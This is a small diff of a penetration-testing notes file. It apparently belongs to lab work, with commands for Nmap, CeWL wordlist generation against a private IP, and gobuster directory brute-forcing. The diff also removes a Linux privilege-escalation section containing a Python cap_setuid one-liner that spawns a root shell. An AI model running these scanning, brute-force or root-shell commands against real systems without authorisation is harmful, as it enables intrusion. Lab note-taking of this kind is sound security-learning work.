@@ -1,5 +1,4 @@
-````md
-# Useful Commands Cheat Sheet
+# Notes
 
 ## Nmap Scan
 ```bash
@@ -53,22 +52,5 @@ cewl http://192.168.184.180:80/ | grep -v CeWL > custom-wordlist.txt
 ## Web Directory Brute Force (Gobuster)
 
 ```bash
-gobuster dir -u http://192.168.120.224 -w /usr/share/wordlists/dirb/common.txt -z
-```
-
-## Linux Privilege Escalation (Python Capabilities)
-
-### Check Capability Example
-
-```bash
-/usr/bin/python3.10 cap_setuid=ep
-```
-
-### Run Root Shell
-
-```bash
-/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
-```
-
-```
+gobuster dir -u http://192.168.120.224 -w /usr/share/wordlists/dirb/common.txt
 ```
